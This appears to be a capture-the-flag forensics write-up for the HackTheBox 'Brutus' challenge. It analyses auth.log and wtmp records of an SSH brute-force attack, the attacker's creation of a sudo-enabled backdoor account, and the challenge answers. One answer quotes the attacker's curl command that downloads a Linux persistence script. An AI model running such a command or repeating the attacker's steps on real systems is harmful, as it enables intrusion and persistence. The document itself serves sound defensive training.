# Brutus
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/332c0735-36c7-4419-8b0a-c3bd0e6699f2)


## Lessons Learned:
- Reviewing UNIX auth.log.
- Identifying the suspect's IP.
- Identify the timestamp for initial manual account logged in / manual entry.
- Reviewing wtmp log file.

## SCENARIO:
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## STEPS:
1. In this task we're given a unix auth.log and wtmp logs.

#### Notes:

```
WTMP is a system log file in Unix and Unix-like operating systems. The wtmp file records all user logins and logouts.
It's located in the /var/log directory in most Unix systems.
```

> 1ST QUESTION --> ANS: 65.2.161.68

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7af97fb5-68f5-418a-898a-cde091decf5e)


2. Upon reviewing the log traffic, we can identify 2 IPs. Those are `203.101.190.9` and `65.2.161.68`.
3. Noticed the first IP tried to login as **root** and is authenticated at `06:19:54`. It's only 1 attempt, could means a normal user or the rightful owner of the account.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4b0d7435-4d0b-4228-a491-c7d07dee7632)


4. For the second IP, it tried few attempts to login as **admin(?)** from `06:31:31`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/57da3c0c-c873-463d-90a2-e44f66ccd9e5)


5. Checking for the IP's reputation, found it's marked as suspicious but not marked as abuse IP.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd72441a-091b-42a2-bcbc-323e81cb013c)


6. However the IP resulting in massive failed login attempt which leads to a security concern. Hence can be marked as the suspect.

> 2ND QUESTION --> ANS: root

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c4b3119b-f1a6-48e8-b4ec-5c689da1984a)


7. Further analysis, found the initial attempt from the suspect IP for root account login.
8. Noticed, after several bruteforce attempts, the suspect finally authenticated as root at `06:31:40` then logout again not long.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/12ed629d-a2ac-46f4-9480-17b6721e7495)


> 3RD QUESTION --> ANS: `06:32:45`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/110ca3ed-445d-435a-9b97-d24c45ba47fd)

9. To identify the initial manual entry is quite tricky. If we analyze further, we shall identified that the attacker did a manual login to `root` user at `06:32:44`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c6364eb9-ed9e-42de-b486-f60b45528c07)


10. However, the `06:32:44` is the timestamp for the attempt for successfull login.
11. So the timestamp for the account's access should be at `06:32:45`.



> 4TH QUESTION --> ANS: 37

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9357b082-412e-4fe2-8418-9770175aa017)


12. After the attacker did a manual login to the root account, a new session number is created. It's **37**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8536251c-673e-4e93-80a0-fd97a4868b0d)



> 5TH QUESTION --> ANS: cyberjunkie

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/66eb2ed9-d302-4e9b-b3f2-367dcc8ecb67)


13. For the lateral movement, the attacker created a new user and new group named **cyberjunkie**.
14. Then the attacker also add **cyberjunkie** to the **sudo** group so it can execute sudo permissions or open any files that requires sudo.

> 6TH QUESTION --> ANS: T1136.001

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5ccabb66-c177-4d59-9657-e2e411f6dbd7)


15. Searching on the internet about MITRE ATT&CK, we can identify that **persistence** has several tech and sub tech.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4df6453d-fdf9-4ff3-983b-a40a41468328)


16. Judging from what the attacker did, the correct one should be the **Create Account** technique with **Local Account** as it's sub-technique.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/51fa79a9-78fe-47eb-a1eb-ae06959b5414)


> 7TH QUESTION --> ANS: 279

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4dffcc64-f4c4-48d9-b674-1e7c3140be20)


17. Upon reviewing the wtmp log file, we're sure that the attacker's session for the root account is destroyed at `06:37 (UTC+8)`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e5812d75-f4dc-497a-b3b7-f43175052b64)


18. To identify the **second** time, review the auth.log which states **remove session** or **close session**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/104a386a-b581-4009-a58d-6d1065760940)


19. Then to calculate the session should be a cumulative time from:

```
06:32:45 - 06:37:24 --> 279 seconds.
```

> 8TH QUESTION --> ANS: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e2e4ac94-d7a5-48ec-af40-ea78df85b254)


20. Furthermore the attacker logged in to the server as **cyberjunkie** and executed sudo command at `06:39:38`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e10dc690-63a9-4fca-ab48-ff2be7eda996)


## IMPORTANT LINKS

```
https://attack.mitre.org/techniques/T1136/
```
